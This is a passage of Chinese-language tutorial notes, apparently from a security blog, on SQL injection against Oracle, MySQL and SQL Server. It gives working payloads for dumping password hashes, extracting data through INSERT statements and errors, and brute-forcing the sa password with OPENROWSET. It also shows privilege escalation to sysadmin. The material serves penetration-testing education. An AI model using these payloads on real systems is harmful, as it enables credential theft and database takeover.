class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>返回当前数据库用户权限</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 获取当前用户的系统权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> user_sys_privs<span class=\"token punctuation\">;</span><span class=\"token comment\">-- how system privileges of the current user</span>\n<span class=\"token comment\">-- 获取当前用户的角色权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> user_role_privs<span class=\"token punctuation\">;</span><span class=\"token comment\">-- show role privileges of the current user</span>\n<span class=\"token comment\">-- 获取当前用户的表格权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> user_tab_privs<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 获取当前用户的列权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> user_col_privs<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>获取所有可能的权限列表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 获取所有系统权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> all_sys_privs<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 获取所有角色权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> all_role_privs<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 获取所有表权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> all_tab_privs<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 获取所有列权限：</span>\n<span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> all_col_privs<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>返回数据库中所有用户的列表，默认任意数据库用户可执行</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> username<span class=\"token punctuation\">,</span>created <span class=\"token keyword\">from</span> all_users <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> created <span class=\"token keyword\">desc</span><span class=\"token punctuation\">;</span>\n\nSCOTT\t<span class=\"token number\">04</span>\t<span class=\"token operator\">-</span>JAN <span class=\"token operator\">-</span>\t<span class=\"token number\">09</span>\nPHP\t<span class=\"token number\">04</span>\t<span class=\"token operator\">-</span>JAN <span class=\"token operator\">-</span>\t<span class=\"token number\">09</span>\nPLSQL\t<span class=\"token number\">02</span>\t<span class=\"token operator\">-</span>JAN <span class=\"token operator\">-</span>\t<span class=\"token number\">09</span>\nMONODEMO\t<span class=\"token number\">29</span>\t<span class=\"token operator\">-</span><span class=\"token keyword\">DEC</span> <span class=\"token operator\">-</span>\t<span class=\"token number\">08</span>\nDEMO1\t<span class=\"token number\">29</span>\t<span class=\"token operator\">-</span><span class=\"token keyword\">DEC</span> <span class=\"token operator\">-</span>\t<span class=\"token number\">08</span>\nALEX\t<span class=\"token number\">14</span>\t<span class=\"token operator\">-</span><span class=\"token keyword\">DEC</span> <span class=\"token operator\">-</span>\t<span class=\"token number\">08</span>\nOWBSYS\t<span class=\"token number\">13</span>\t<span class=\"token operator\">-</span><span class=\"token keyword\">DEC</span> <span class=\"token operator\">-</span>\t<span class=\"token number\">08</span>\nFLOWS_030000\t<span class=\"token number\">13</span>\t<span class=\"token operator\">-</span><span class=\"token keyword\">DEC</span> <span class=\"token operator\">-</span>\t<span class=\"token number\">08</span>\nAPEX <span class=\"token keyword\">PUBLIC</span> <span class=\"token keyword\">USER</span>\t<span class=\"token number\">13</span>\t<span class=\"token operator\">-</span><span class=\"token keyword\">DEC</span> <span class=\"token operator\">-</span>\t<span class=\"token number\">08</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在Oracle 10g R2之后的版本中，普通用户可使用下列SELECT语句检索数据库的用户名和哈希口令</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">,</span> astatus <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span><span class=\"token comment\">#&gt;0 and length(password)=16 </span>\n<span class=\"token comment\">-- astatus (0=open, 9=locked&amp; expired)</span>\n\nSYS     AD24A888FC3B1BE7 <span class=\"token number\">0</span>\nSYSTEM  BD3D49AD69E3FA34 <span class=\"token number\">0</span>\nOUTLN   <span class=\"token number\">4</span>A3BA55E08595081 <span class=\"token number\">9</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Oracle llg中，Oracle已经修改了所使用口令的哈希算法，而且哈希口令位于另外 一个不同的列中（spare4列），如下所示：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> name<span class=\"token punctuation\">,</span>spare4 <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">where</span> <span class=\"token keyword\">type</span><span class=\"token comment\">#&gt;0 and length(spare4)=62 </span>\n\nSYS\nS:<span class=\"token number\">1336</span>FB26ACF58354164952E502B4F726FF8B5D382012D2E7B1EC99C426A7\nSYSTEM\nS:<span class=\"token number\">38968</span>E8CEC12026112B0010BCBA3ECC2FD278AFA17AE363FDD74674F2651<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>高级用户，找到加密内容的表，都加密了一定会有可利用的</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token keyword\">table</span> name<span class=\"token punctuation\">,</span><span class=\"token keyword\">column</span> name<span class=\"token punctuation\">,</span>encryption_alg<span class=\"token punctuation\">,</span>salt <span class=\"token keyword\">from</span> dba_encrypted_columns<span class=\"token punctuation\">;</span> \n\n<span class=\"token keyword\">TABLE</span> NAME       <span class=\"token keyword\">COLUMN</span> NAME    ENCRYPTION ALG       SALT CREDITCARD\t\tCCNR          AES256              <span class=\"token keyword\">NO</span>\nCREDITCARD\t\t  CVE           AES256              <span class=\"token keyword\">NO</span>\nCREDITCARD        VALID          AES256              <span class=\"token keyword\">NO</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>检索数据库存在哪些DBA账户</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">Select</span> grantee<span class=\"token punctuation\">,</span>granted_role<span class=\"token punctuation\">,</span>admin_option<span class=\"token punctuation\">,</span>default_role <span class=\"token keyword\">from</span> dba_role_privs <span class=\"token keyword\">where</span> granted_role<span class=\"token operator\">=</span><span class=\"token string\">'DBA'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"在INSERT查询中实施注入攻击\"><a href=\"#在INSERT查询中实施注入攻击\" class=\"headerlink\" title=\"在INSERT查询中实施注入攻击\"></a>在INSERT查询中实施注入攻击</h3><p>更新数据后执行注入查询语句，update，delete一个意思</p>\n<h4 id=\"第一种情形：插入用户规定的数据\"><a href=\"#第一种情形：插入用户规定的数据\" class=\"headerlink\" title=\"第一种情形：插入用户规定的数据\"></a>第一种情形：插入用户规定的数据</h4><h5 id=\"插入的不是最后一列\"><a href=\"#插入的不是最后一列\" class=\"headerlink\" title=\"插入的不是最后一列\"></a>插入的不是最后一列</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 插入模板</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'sql'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'notsql'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>插入第一列，构造SQL代码关闭<code>sql</code>，再构建我们需要查询的第二列，注释掉其他部分</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'sql'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">TOP</span> <span class=\"token number\">1</span> name <span class=\"token operator\">+</span> <span class=\"token string\">' | '</span> <span class=\"token operator\">+</span> master<span class=\"token punctuation\">.</span>sys<span class=\"token punctuation\">.</span>fn_varbintohexstr<span class=\"token punctuation\">(</span>password_hash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>sql_logins<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- ','notsql')</span>\n\n<span class=\"token comment\">-- fn_varbintohexstr将二进制的哈希值转换为十六进制格式</span>\n\n<span class=\"token comment\">-- http://test/?sql=sql',(SELECT TOP 1 name + ' | ' + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- &amp;notsql=notsql</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"插入的是最后一列\"><a href=\"#插入的是最后一列\" class=\"headerlink\" title=\"插入的是最后一列\"></a>插入的是最后一列</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 插入模板</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span> col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'notsql'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'sql'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>在mysql中只有处于ANSI模式(或者任何实现了 PIPES_AS_QUOTES的其他模式，比如DB2、ORACLE或MAXDB)，管道符才会被解析成连接符。然而，一般都是未实现PIPES_AS_QUOTES(比如处于TRADITIONAL模式)，那么||操作符将被解析为一个OR逻辑操作符，而不是一个连接操作符。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'bar'</span><span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> @<span class=\"token variable\">@version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span> CONCAT<span class=\"token punctuation\">(</span><span class=\"token string\">'bar'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> @@ version<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>利用整数与字符相加，优先显示数字的特性</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span> <span class=\"token operator\">+</span><span class=\"token comment\">/**/</span>substring<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span><span class=\"token comment\">/**/</span>@<span class=\"token variable\">@version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>显示@@version的第一个字符，/**/绕过空格</p>\n<p>转化非整数字符使用ASCII()</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>co12<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'bar'</span><span class=\"token operator\">+</span><span class=\"token comment\">/**/</span>ascii<span class=\"token punctuation\">(</span>substring<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bar'</span><span class=\"token operator\">+</span><span class=\"token comment\">/**/</span>ascii<span class=\"token punctuation\">(</span>substring<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token punctuation\">(</span>col1<span class=\"token punctuation\">,</span>col2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bar'</span><span class=\"token operator\">+</span><span class=\"token comment\">/**/</span>ascii<span class=\"token punctuation\">(</span>substring<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"第二种情形：生成INSERT错误\"><a href=\"#第二种情形：生成INSERT错误\" class=\"headerlink\" title=\"第二种情形：生成INSERT错误\"></a>第二种情形：生成INSERT错误</h4><p>为了不污染原数据表，执行子查询，使insert失败，返回错误中得到信息</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> users <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'foo'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\nfoo'<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">top</span> <span class=\"token number\">1</span> name <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> age<span class=\"token operator\">=</span>@<span class=\"token variable\">@version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>先执行子查询，由于@@version不是数字，报错，不执行insert</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> columnl <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">table</span> <span class=\"token number\">1</span> <span class=\"token keyword\">WHERE</span> column1 <span class=\"token operator\">=</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>标量子查询就是只返回单列值而不是多列值或多行的子查询，如果子查询返回一个值或者NULL，外部将执行，返回超过一行就会终止外部查询展示错误信息，所以可以插入两个select</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> @<span class=\"token variable\">@version</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'5.1.56%'</span> <span class=\"token keyword\">THEN</span> SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token string\">'somevalue'</span> <span class=\"token keyword\">END</span> <span class=\"token keyword\">FROM</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'valuel'</span> <span class=\"token keyword\">AS</span> foobar<span class=\"token punctuation\">)</span> <span class=\"token keyword\">UNION</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'value2'</span> <span class=\"token keyword\">AS</span> foobar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> ALIAS<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>CASE子句检查提取的MySQL版本信息，如果遇到特定的版本，SLEEP命令将执行以延迟5秒的时间。这可以告诉我们MySQL是否是某个特定的版本，同时UNION命令将确保向外部SELECT返回两行数据，从而产生错误。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 插入模板</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token number\">1</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'injectable_parameter'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- 注入参数</span>\n<span class=\"token string\">'|| SELECT (SELECT CASE WHEN @@version LIKE '</span><span class=\"token number\">5.1</span><span class=\"token number\">.56</span><span class=\"token operator\">%</span><span class=\"token string\">' THEN SLEEP(5) ELSE '</span>somevalue<span class=\"token string\">' END FROM ((SELECT '</span>valuel<span class=\"token string\">' AS foobar) UNION (SELECT '</span>value2<span class=\"token string\">' AS foobar)) ALIAS) ||'</span>\n<span class=\"token comment\">-- 拼接后</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">table</span> <span class=\"token number\">1</span> <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token operator\">||</span> <span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> @<span class=\"token variable\">@version</span> <span class=\"token operator\">LIKE</span> <span class=\"token string\">'5.1.56%'</span> <span class=\"token keyword\">THEN</span> SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token string\">'somevalue'</span> <span class=\"token keyword\">END</span> <span class=\"token keyword\">FROM</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'valuel'</span> <span class=\"token keyword\">AS</span> foobar<span class=\"token punctuation\">)</span> <span class=\"token keyword\">UNION</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'value2'</span> <span class=\"token keyword\">AS</span> foobar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> ALIAS<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>REGEXP操作符</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'a'</span> <span class=\"token operator\">REGEXP</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token operator\">&lt;</span>condition<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">THEN</span> <span class=\"token string\">'.*'</span> <span class=\"token keyword\">ELSE</span> <span class=\"token string\">'*'</span> <span class=\"token keyword\">END</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">FROM</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'fool'</span> <span class=\"token keyword\">AS</span> bar<span class=\"token punctuation\">)</span> <span class=\"token keyword\">UNION</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'foo2'</span> <span class=\"token keyword\">AS</span> bar<span class=\"token punctuation\">)</span> foobar<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果条件(condition)为true, CASE子句将使用有效的正则表达式它将向最外层的 SELECT语句返回两行数据，我们将接收到常见的错误：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ERROR <span class=\"token number\">1242</span> <span class=\"token punctuation\">(</span><span class=\"token number\">21000</span><span class=\"token punctuation\">)</span>: Subquery returns <span class=\"token function\">more</span> than <span class=\"token number\">1</span> row<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果条件为false, REGEXP将采用作为参数，它并不是一个有效的正则表达式， 在这种情况下数据库服务器将返回下列错误：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ERROR <span class=\"token number\">1139</span> <span class=\"token punctuation\">(</span><span class=\"token number\">42000</span><span class=\"token punctuation\">)</span> <span class=\"token builtin class-name\">:</span> Got error <span class=\"token string\">'repetition-operator operand invalid'</span> from regexp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test/?name=';INSERT+INTO+users(id,pass,privs)+VALUES+('test','test',0)-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"提升权限\"><a href=\"#提升权限\" class=\"headerlink\" title=\"提升权限\"></a>提升权限</h3><p>由于对普通用户存在着限制，要想充分发挥前面介绍的几种攻击的潜力，就必须获取管理员访问权。</p>\n<h4 id=\"SQL-Server-1\"><a href=\"#SQL-Server-1\" class=\"headerlink\" title=\"SQL Server\"></a>SQL Server</h4><p><code>OPENROWSET</code>作用于SQL Server上，实现对远程OLE DB数据源(例如另一个SQL Server数据库)的一次性连接。DBA可用它来检索远程数据库上的数据，以此作为永久连接(link)两个数 据库的一种手段。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSSOCN; Address=10.0.2.2;uid=foo;pwd=password'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SELECT columnl FROM tableA'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上述语句中以用户foo连接到地址为10.0.2.2的SQL Server并执行<code>select column1 from tableA</code>查询，最外层的查询传递并返回该查询的结果。foo是地址为10.0.2.2的数据库的一个用户，而不是首次执行OPENROWSET时的数据库用户。</p>\n<p>openrowset可以用来爆破sa提权，有三个要点</p>\n<ul>\n<li><p>OPENROWSET必须提供执行连接的数据库上的有效凭证。</p>\n</li>\n<li><p>OPENROWSET不仅可用于连接远程数据库，还可用于执行本地连接；执行本地连接时，使用用户在OPENROWSET调用中指定的权限。</p>\n</li>\n<li><p>在SQL Server 2000上，所有用户均可调用OPENROWSET;而在SQL Server 2005和 2008上，默认情况下该操作被禁用。但有时会被DBA重新启用</p>\n</li>\n<li><p>openrowset至少返回一行，所以加个在没有其他会显示是，必须加个<code>select 1</code>，当然也能加其他的</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- 爆破sa口令</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSSOCN;Address=;uid=sa; pwd=foo'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'select 1'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>foo是口令的话返回1，不正确返回<code>Login failed for user 'sa'.</code></p>\n<p>如果找到了sa口令，可以使用<code>sp_addsrvrolemember</code>储存过程将用户添加至sysadmin组，这样就能提升权限</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSSOCN;\nAddress=;uid=sa;pwd=password'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SELECT 1; EXEC\nmaster.dbo.sp_addsrvrolemeniber \"appdbuser\",\"sysadmin\"'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- 两个参数appdbuser是用户名，第二个是组名</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注入一个完整的过程，首先构造一个包含OPENROWSET查询和正确用户名的字符串@q，然后通过将@q传递给xp execresultset扩展存储过程（在SQL Server 2000上，所有用户均可调用它）来执行该查询。</p>\n<pre class=\"line-numbers 